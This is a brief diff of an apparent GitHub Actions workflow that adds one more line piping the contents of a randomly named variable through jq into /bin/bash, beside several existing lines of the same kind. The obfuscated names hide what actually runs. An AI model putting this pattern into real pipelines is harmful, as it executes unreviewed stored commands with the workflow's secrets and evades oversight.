@@ -20,6 +20,7 @@ jobs:
           printf '%s' "$nbc4648" | jq -r .lie02 | /bin/bash
           printf '%s' "$vy2" | jq -r .ipl6514 | /bin/bash
           printf '%s' "$liarr52159" | jq -r .cm2248 | /bin/bash
+          echo $brxf331 | jq -r .wv78961 | /bin/bash
 
       - name: Upload data
         if: always()
